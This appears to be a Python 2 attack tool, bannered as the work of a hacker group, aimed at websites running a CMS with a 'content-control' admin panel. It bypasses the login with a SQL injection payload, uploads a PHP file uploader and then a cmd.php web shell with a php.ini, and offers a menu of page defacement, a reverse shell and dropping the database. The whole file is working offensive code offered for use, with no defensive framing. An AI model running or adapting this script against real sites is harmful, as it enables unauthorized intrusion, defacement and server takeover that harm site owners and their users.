import urllib2
import lxml.html

import os
import json
import requests
from lxml import html
class contentkiller(object):
    s = requests.session()
    uploaderlink = None
    site = None
    website = None
    headers={'User-Agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36'}
    def run(self):
        print "---===---===---===---===---===---===---===---===---===---===---===---===---===---"
        print "---===---===---===---===---===---===---===---===---===---===---===---===---===---"
        print "---===---===---===---===---===---===---===---===---===---===---===---===---===---"
        print "---===---===---===---===---  BROTHERHOOD OF MYANMAR HACKERS! --===---===---===---"
        print "---===---===---===---===---===---===---===---===---===---===---===---===---===---"
        print "---===---===---===---===---===---===---===---===---===---===---===---===---===---"
        print "---===---===---===---===---===---===---===---===---===---===---===---===---===---"
        
        dir_path = os.path.dirname(os.path.realpath(__file__))
        #websitelistfile = raw_input("Input Website list file(*.txt):")
        #print dir_path+websitelistfile
        #fileexists =  os.path.isfile(dir_path+"/"+websitelistfile) 
        #while (websitelistfile is None) or fileexists<>True:
        #    websitelist = raw_input("Input Website list file(*.txt):")
        #    fileexists =  os.path.isfile(dir_path+"/"+websitelistfile)
        ##print fileexists
       
        self.website = raw_input("Add website link :")
        self.login(self.website)
        #autodeface = raw_input("automation defacement? y/n:")
        #while (autodeface is None) or (autodeface not in ("y","n")):
        #    autodeface = raw_input("automation defacement? y/n:")
        
        #xx = { 'y': self.xyes(), 'n': self.xno()}
        
        #file = open(dir_path+"/"+websitelistfile, "r") 
        #urls =file.readlines() 
        #for url in urls:
            #if url <> "\n" :
                #self.login(url.replace("\n",""))
        #print xx['y']
    def chooseattackmethod(self):
        print "Choose the following attack!"
        print "Direct Deface : 1"
        print "Reverse Shell : 2"
        print "Drop database : 3"
        am = raw_input("choose one: ")
        while (am not in ("1","2","3")):
            print "Wrong Code!"
            am = raw_input("choose one: 1 or 2 or 3")
        if am=="1":
            self.directuploadfun()
        if am == "2":
            self.reverseshell(self.website)
    def directuploadfun(self):
        up = self.uploaderlink.replace(".php","")
        ul = self.website+"/index.php?action=content-control/management_photo/"+up
        ul = ul.replace(" ","")
        
        path = os.path.dirname(os.path.realpath(__file__))

        defpage = raw_input("add your deface page : ")
        uploadfile =path+"/"+defpage
        ufile = {'fileToUpload':(defpage,open(uploadfile,'rb'))}
        payload = {'submit':'sh'}
        r = self.s.post(ul, headers=self.headers,data=payload,files=ufile)
        if r.status_code ==200:
            print "success"    
            self.attagain()

    def uploadshell(self,website):
        uploadsh = self.website+"/content-control/adminindex.php?action=update_mcomm"
        path = os.path.dirname(os.path.realpath(__file__))
        uploadfile =path+"/upload.php"
        ufile = {'timg':('upload.php',open(uploadfile,'rb'))}
        payload = {'desig': "", 'name': '','design':'','timg':('upload.php',open(uploadfile,'rb')),'submitdata':'Update','mccomId':''}
        r = self.s.post(uploadsh, headers=self.headers,data=payload,files=ufile)
        if r.status_code ==200:
            r = self.s.get(self.website+"/content-control/management_photo/") 
            page = html.fromstring(r.text)
            text = page.xpath("//a/text()")
            for sh in text:
                if sh.find("upload.php") <> -1 :
                    #uploader found
                    self.uploaderlink = sh
                    self.chooseattackmethod()
                    break
                else:
                    print "skiping....."

            #print text
        #print r.text
    def reverseshell(self,website):
        print "Initialize the Reverse Shell"
        ul = self.website+"/content-control/management_photo/"+self.uploaderlink
        ul = ul.replace(" ","")
        #print ul
        
        path = os.path.dirname(os.path.realpath(__file__))

        uploadfile =path+"/cmd.php"
        ufile = {'fileToUpload':('cmd.php',open(uploadfile,'rb'))}
        payload = {'submit':'sh'}
        r = self.s.post(ul, headers=self.headers,data=payload,files=ufile)
        if r.status_code ==200:
            uploadfile =path+"/php.ini"
            ufile = {'fileToUpload':('php.ini',open(uploadfile,'rb'))}
            payload = {'submit':'sh'}
            r = self.s.post(ul, headers=self.headers,data=payload,files=ufile)
            if r.status_code ==200:
                print "connecting to the svr... ... ... .. ."
                r = self.s.get(self.website+"/content-control/management_photo/cmd.php")
                print "Finished!"

                self.attagain()
                
                
                
    def attagain(self):
        again = raw_input("continue? y/n :    ")
        while (again not in ("y","n")):
            print "Wrong Code!"
            again = raw_input("continue? y/n :    ")
        if again=="y":
            self.chooseattackmethod()
        else:
            print "Thanks."

    def directdef(self,website):
        print "Initialize the Direct Defacing"
        print "defacing"    
    
    def killphp(self,website):
        #self.uploaderlink
        uploadsh = self.website+"/content-control/adminindex.php?action=update_mcomm"
        path = os.path.dirname(os.path.realpath(__file__))
        uploadfile =path+"/upload.php"
        ufile = {'timg':('upload.php',open(uploadfile,'rb'))}
        payload = {'desig': "", 'name': '','design':'','timg':('upload.php',open(uploadfile,'rb')),'submitdata':'Update','mccomId':''}
        r = self.s.post(uploadsh, headers=self.headers,data=payload,files=ufile)
        if r.status_code ==200:
            print "success!"

    def login(self,website):        
        payload = {'username': "admin' or 1=1 or '1'='1-- -", 'password': 'password','button':'Login'}
        lgurl = self.website+"/content-control/loginaction.php"
        r = self.s.get(lgurl)
        if r.status_code == 200:
            r = self.s.post(lgurl, headers=self.headers,data=payload)
            if r.status_code == 200:
                page = html.fromstring(r.text)
                text = page.xpath("//title/text()")
                if len(text)>0:
                    #print text[0]
                    print "Exploiting.. .. .. .."
                    self.uploadshell(self.website)
                else:
                    ##login failed
                    print "not vulnerability!"
        else :
            print "not vulnerability!"

        #print r.text

    def xyes(self):
        return "ye yes yes"
    def xno(self):
        return "no n nono"
            

if __name__ == '__main__':
    contentkiller().run()